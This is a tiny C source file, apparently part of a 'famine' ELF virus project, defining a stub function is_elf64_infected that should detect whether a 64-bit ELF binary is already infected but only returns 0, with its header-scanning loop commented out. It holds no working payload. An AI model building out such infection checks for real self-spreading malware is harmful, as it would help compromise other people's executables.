#include "famine.h"

#include <stdint.h> // uint32_t

int is_elf64_infected(t_elf64 *elf64)
{
	// for (uint32_t i = 0; i + 1 < elf64->ehdr->e_phnum; i++) {
	// 	memcmp(elf64->phdr[i]
	// }
	(void)elf64;
	return (0);
}
